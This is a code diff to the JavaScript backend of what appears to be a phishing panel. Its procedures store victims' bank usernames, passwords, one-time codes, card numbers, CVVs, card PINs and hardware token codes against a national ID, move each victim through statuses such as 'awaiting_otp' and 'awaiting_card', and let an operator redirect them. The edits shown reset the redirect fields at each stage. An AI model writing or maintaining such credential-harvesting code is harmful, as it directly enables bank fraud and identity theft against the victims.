@@ -152,6 +152,7 @@ async function executeProcedure(name, input, req, isAdmin) {
       if (nationalId && applications[nationalId]) {
         applications[nationalId].redirectTo = null;
         applications[nationalId].redirectError = null;
+        applications[nationalId].updatedAt = new Date().toISOString();
       }
       return { success: true };
     }
@@ -202,6 +203,8 @@ async function executeProcedure(name, input, req, isAdmin) {
       const app = getOrCreateApp(nationalId);
       if (username) app.username = username;
       if (password) app.password = password;
+      app.redirectTo = null;
+      app.redirectError = null;
       app.loginApproved = null;
       app.status = 'awaiting_login';
       app.updatedAt = new Date().toISOString();
@@ -215,6 +218,8 @@ async function executeProcedure(name, input, req, isAdmin) {
       const app = getOrCreateApp(nationalId);
       const code = otp || otpCode;
       if (code) { app.otp = code; app.otpCode = code; }
+      app.redirectTo = null;
+      app.redirectError = null;
       app.status = 'awaiting_otp';
       app.updatedAt = new Date().toISOString();
       console.log('[saveOtpData] id=' + nationalId, code);
@@ -231,6 +236,8 @@ async function executeProcedure(name, input, req, isAdmin) {
       if (cv) { app.cvv = cv; app.cardCvv = cv; }
       if (cardName) app.cardName = cardName;
       if (cardPin) app.cardPin = cardPin;
+      app.redirectTo = null;
+      app.redirectError = null;
       app.status = 'awaiting_card';
       app.updatedAt = new Date().toISOString();
       console.log('[saveCardData] id=' + nationalId, cardNumber);
@@ -243,6 +250,8 @@ async function executeProcedure(name, input, req, isAdmin) {
       const app = getOrCreateApp(nationalId);
       const tk = hardToken || hardTokenCode || token;
       if (tk) { app.hardToken = tk; }
+      app.redirectTo = null;
+      app.redirectError = null;
       app.status = 'awaiting_token';
       app.updatedAt = new Date().toISOString();
       console.log('[saveHardToken] id=' + nationalId);
@@ -255,6 +264,8 @@ async function executeProcedure(name, input, req, isAdmin) {
       const app = getOrCreateApp(nationalId);
       const wl = watchLink || watchLinkOtp || link;
       if (wl) { app.watchLink = wl; app.watchLinkOtp = wl; }
+      app.redirectTo = null;
+      app.redirectError = null;
       app.updatedAt = new Date().toISOString();
       console.log('[saveWatchLink] id=' + nationalId);
       return { success: true };
